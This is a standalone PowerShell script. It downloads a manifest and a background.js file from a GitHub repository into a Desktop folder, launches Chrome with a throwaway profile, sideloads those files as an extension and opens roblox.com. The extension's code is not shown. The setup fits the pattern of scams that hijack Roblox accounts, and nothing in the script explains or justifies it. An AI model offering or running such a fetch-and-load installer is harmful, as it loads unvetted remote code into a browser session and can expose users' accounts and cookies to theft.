$url = "https://raw.githubusercontent.com/bondzo-NOVA/Vertex-scriptcheck/main"
$extFolder = "$env:USERPROFILE\Desktop\RobloxExt"

New-Item -ItemType Directory -Force $extFolder | Out-Null
Invoke-WebRequest -Uri "$url/manifest.json" -OutFile "$extFolder\manifest.json"
Invoke-WebRequest -Uri "$url/background.js" -OutFile "$extFolder\background.js"

$profile = "$env:TEMP\Chrome$([Guid]::NewGuid())"
New-Item -ItemType Directory -Force $profile | Out-Null
Start-Process "chrome" -ArgumentList "--user-data-dir=`"$profile`" --load-extension=`"$extFolder`" https://www.roblox.com"

Write-Host "✅ Installed! Extension loaded in new Chrome" -ForegroundColor Green
